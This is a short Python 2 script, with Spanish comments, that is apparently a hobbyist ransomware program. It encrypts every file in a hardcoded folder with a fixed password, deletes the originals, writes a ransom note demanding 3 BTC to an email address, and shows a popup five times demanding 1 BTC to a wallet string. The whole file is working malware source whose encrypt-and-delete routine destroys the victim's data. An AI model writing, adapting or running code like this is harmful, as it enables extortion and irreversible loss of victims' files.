# -*- coding: utf-8 -*-

import os
from simplecrypt import encrypt
import Tkinter
import tkMessageBox

path = '/Users/g3orgx/Desktop/prueba' #La ruta donde cifrara archivos
password='yottahack' #Password con el que cifrara
contador=0; 


def cifrado():

    for archivos in os.listdir(path):

        os.chdir(path)
       
        try:
            
            with open(archivos, 'rb') as r:

                files = r.read()

                cifrado= encrypt(password,files)

                new_file = '(Archivo-cifrado)'+os.path.basename(archivos)+'.encrypt'
                with open(new_file, 'wb') as n:

                    n.write(cifrado)
                    n.close()
                    os.remove(archivos)
        except:

            pass

def archivo():

    msg = """

    Tus archivos han sido cifrados, por lo que requerimos un pago de 3 BTC, ponte en contacto
    con nostros al correo liberamisarchivs@onion.com

    """

    file=open('Recupera Tus Archivos.txt','w')
    file.write(msg)
    file.close

def mensaje():

    mensaje= """
    Tus archivos han sido cifrados, para recuperar tu información sera necesario que deposites 1 BTC al siguiente monedero

    EE$fkks3994052034203 """

    tkMessageBox.showwarning("Secuestrado",mensaje)
 
cifrado()
archivo()


while (contador<5):
    mensaje()
    contador=contador+1